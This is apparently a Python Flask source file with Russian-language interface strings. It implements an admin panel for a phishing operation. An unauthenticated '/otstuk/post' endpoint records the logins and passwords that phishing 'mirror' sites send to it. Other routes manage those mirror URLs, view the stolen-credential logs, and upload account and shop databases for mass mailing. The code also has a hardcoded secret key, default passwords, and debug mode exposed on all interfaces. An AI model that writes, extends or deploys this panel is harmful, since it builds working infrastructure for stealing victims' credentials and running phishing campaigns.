import os
from datetime import datetime
from flask import Flask, render_template, request, redirect, url_for, send_from_directory, flash
from flask_login import LoginManager, UserMixin, login_user, login_required, logout_user, current_user
from werkzeug.security import generate_password_hash, check_password_hash
from werkzeug.utils import secure_filename

app = Flask(__name__)
app.secret_key = "super-secret-key-12345"

UPLOAD_FOLDER = "uploads"
SITES_FILE = "sites.txt"
LOGS_FILE = "otstuk_logs.txt"
ACCOUNTS_FILE = "accounts.txt"
SHOPS_FILE = "shops.txt"
UPDATES_FILE = "updates.txt"

os.makedirs(UPLOAD_FOLDER, exist_ok=True)

login_manager = LoginManager()
login_manager.init_app(app)
login_manager.login_view = "login"

class User(UserMixin):
    def __init__(self, id, username, role):
        self.id = id
        self.username = username
        self.role = role

users = {
    "admin": {"password": generate_password_hash("admin123"), "id": "1", "role": "admin"},
    "user":  {"password": generate_password_hash("user123"), "id": "2", "role": "user"}
}

@login_manager.user_loader
def load_user(user_id):
    for username, data in users.items():
        if data["id"] == user_id:
            return User(user_id, username, data["role"])
    return None

def load_sites():
    if not os.path.exists(SITES_FILE):
        return []
    with open(SITES_FILE, "r", encoding="utf-8") as f:
        return [{"name": line.split("|")[0].strip(), "url": line.split("|")[1].strip()} 
                for line in f if "|" in line]

def load_otstuk_logs():
    if not os.path.exists(LOGS_FILE):
        return []
    with open(LOGS_FILE, "r", encoding="utf-8") as f:
        return [line.strip() for line in f if line.strip()]

# ====================== МАРШРУТЫ ======================
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        user_data = users.get(username)
        if user_data and check_password_hash(user_data['password'], password):
            login_user(User(user_data['id'], username, user_data['role']))
            return redirect(url_for('dashboard'))
        flash('Неверный логин или пароль', 'danger')
    return render_template('login.html')

@app.route('/logout')
@login_required
def logout():
    logout_user()
    return redirect(url_for('login'))

@app.route('/')
@login_required
def dashboard():
    files = []
    for filename in os.listdir(UPLOAD_FOLDER):
        filepath = os.path.join(UPLOAD_FOLDER, filename)
        if os.path.isfile(filepath):
            size = os.path.getsize(filepath)
            mtime = os.path.getmtime(filepath)
            files.append({
                'name': filename,
                'size': f"{size / 1024:.1f} KB",
                'upload_time_short': datetime.fromtimestamp(mtime).strftime('%d.%m %H:%M')
            })
    files.sort(key=lambda x: x['upload_time_short'], reverse=True)
    is_admin = getattr(current_user, 'role', None) == 'admin'
    return render_template('dashboard.html', files=files, is_admin=is_admin, active='files')

@app.route('/sites')
@login_required
def sites():
    sites_list = load_sites()
    is_admin = getattr(current_user, 'role', None) == 'admin'
    return render_template('sites.html', sites=sites_list, is_admin=is_admin, active='sites')

@app.route('/status')
@login_required
def status():
    is_admin = getattr(current_user, 'role', None) == 'admin'
    file_count = len([f for f in os.listdir(UPLOAD_FOLDER) if os.path.isfile(os.path.join(UPLOAD_FOLDER, f))])
    return render_template('status.html', is_admin=is_admin, active='status',
                           file_count=file_count, sites_count=len(load_sites()),
                           server_time=datetime.now().strftime('%Y-%m-%d %H:%M:%S'))

@app.route('/otstuk')
@login_required
def otstuk():
    logs = load_otstuk_logs()
    is_admin = getattr(current_user, 'role', None) == 'admin'
    return render_template('otstuk.html', logs=logs, is_admin=is_admin, active='otstuk')

@app.route('/users')
@login_required
def users_page():
    if getattr(current_user, 'role', None) != 'admin':
        flash('Доступ запрещён', 'danger')
        return redirect(url_for('dashboard'))
    user_list = [{"username": u, "role": d["role"]} for u, d in users.items()]
    return render_template('users.html', users=user_list, active='users')

@app.route('/rassylka')
@login_required
def rassylka():
    is_admin = getattr(current_user, 'role', None) == 'admin'
    accounts_count = 0
    shops_count = 0
    if os.path.exists(ACCOUNTS_FILE):
        with open(ACCOUNTS_FILE, "r", encoding="utf-8") as f:
            accounts_count = len([line for line in f if line.strip()])
    if os.path.exists(SHOPS_FILE):
        with open(SHOPS_FILE, "r", encoding="utf-8") as f:
            shops_count = len([line for line in f if line.strip()])
    return render_template('rassylka.html', is_admin=is_admin, active='rassylka',
                           accounts_count=accounts_count, shops_count=shops_count)

# ====================== ФАЙЛЫ ======================
@app.route('/upload', methods=['POST'])
@login_required
def upload_file():
    if getattr(current_user, 'role', None) != 'admin':
        flash('Нет прав на загрузку файлов', 'danger')
        return redirect(url_for('dashboard'))
    file = request.files.get('file')
    if file and file.filename:
        filename = secure_filename(file.filename)
        file.save(os.path.join(UPLOAD_FOLDER, filename))
        flash('Файл успешно загружен!', 'success')
    return redirect(url_for('dashboard'))

@app.route('/download/<filename>')
@login_required
def download_file(filename):
    return send_from_directory(UPLOAD_FOLDER, filename, as_attachment=True)

@app.route('/delete/<filename>')
@login_required
def delete_file(filename):
    if getattr(current_user, 'role', None) != 'admin':
        flash('Нет прав', 'danger')
        return redirect(url_for('dashboard'))
    try:
        os.remove(os.path.join(UPLOAD_FOLDER, filename))
        flash('Файл удалён', 'success')
    except:
        flash('Ошибка удаления', 'danger')
    return redirect(url_for('dashboard'))

# ====================== ЗЕРКАЛА ======================
@app.route('/add_site', methods=['POST'])
@login_required
def add_site():
    if getattr(current_user, 'role', None) != 'admin':
        flash('Нет прав', 'danger')
        return redirect(url_for('sites'))
    name = request.form.get('name', '').strip()
    url = request.form.get('url', '').strip()
    if name and url:
        with open(SITES_FILE, "a", encoding="utf-8") as f:
            f.write(f"{name}|{url}\n")
        flash('Зеркало успешно добавлено!', 'success')
    else:
        flash('Заполните все поля', 'danger')
    return redirect(url_for('sites'))

@app.route('/delete_site/<int:index>')
@login_required
def delete_site(index):
    if getattr(current_user, 'role', None) != 'admin':
        flash('Нет прав на удаление зеркал', 'danger')
        return redirect(url_for('sites'))
    
    sites = load_sites()
    if 0 <= index < len(sites):
        deleted_name = sites[index]['name']
        del sites[index]
        with open(SITES_FILE, "w", encoding="utf-8") as f:
            for s in sites:
                f.write(f"{s['name']}|{s['url']}\n")
        flash(f'Зеркало "{deleted_name}" успешно удалено', 'success')
    else:
        flash('Зеркало не найдено', 'danger')
    return redirect(url_for('sites'))

# ====================== ОТСТУК ======================
@app.route('/otstuk/post', methods=['POST'])
def otstuk_post():
    login = request.form.get('login', '')
    password = request.form.get('password', '')
    mirror = request.form.get('mirror', 'Неизвестно')
    if login or password:
        with open(LOGS_FILE, "a", encoding="utf-8") as f:
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            f.write(f"[{timestamp}] Логин: {login} | Пароль: {password} | Зеркало: {mirror}\n")
    return "OK", 200

# ====================== РАССЫЛКА ======================
@app.route('/upload_accounts', methods=['POST'])
@login_required
def upload_accounts():
    if getattr(current_user, 'role', None) != 'admin':
        flash('Нет прав', 'danger')
        return redirect(url_for('rassylka'))
    file = request.files.get('accounts_file')
    if file and file.filename:
        file.save(ACCOUNTS_FILE)
        flash('База аккаунтов успешно загружена!', 'success')
    return redirect(url_for('rassylka'))

def load_updates():
    if not os.path.exists(UPDATES_FILE):
        return []
    with open(UPDATES_FILE, "r", encoding="utf-8") as f:
        updates = []
        for line in f:
            if "|" in line:
                date, title, content = line.strip().split("|", 2)
                updates.append({
                    "date": date,
                    "title": title,
                    "content": content
                })
        return updates[::-1]  # новые сверху
@app.route('/upload_shops', methods=['POST'])
@login_required
def upload_shops():
    if getattr(current_user, 'role', None) != 'admin':
        flash('Нет прав', 'danger')
        return redirect(url_for('rassylka'))
    file = request.files.get('shops_file')
    if file and file.filename:
        file.save(SHOPS_FILE)
        flash('База шопов успешно загружена!', 'success')
    return redirect(url_for('rassylka'))
@app.route('/updates')
@login_required
def updates():
    updates_list = load_updates()
    is_admin = getattr(current_user, 'role', None) == 'admin'
    return render_template('updates.html',
                           updates=updates_list,
                           is_admin=is_admin,
                           active='updates')
@app.route('/add_update', methods=['POST'])
@login_required
def add_update():
    if getattr(current_user, 'role', None) != 'admin':
        flash('Нет прав', 'danger')
        return redirect(url_for('updates'))

    title = request.form.get('title', '').strip()
    content = request.form.get('content', '').strip()

    if title and content:
        with open(UPDATES_FILE, "a", encoding="utf-8") as f:
            date = datetime.now().strftime('%Y-%m-%d %H:%M')
            f.write(f"{date}|{title}|{content}\n")
        flash('Обновление добавлено!', 'success')
    else:
        flash('Заполните все поля', 'danger')

    return redirect(url_for('updates'))

if __name__ == '__main__':
    print("🚀 Сервер запущен → http://127.0.0.1:5000")
    app.run(debug=True, host='0.0.0.0', port=5000)
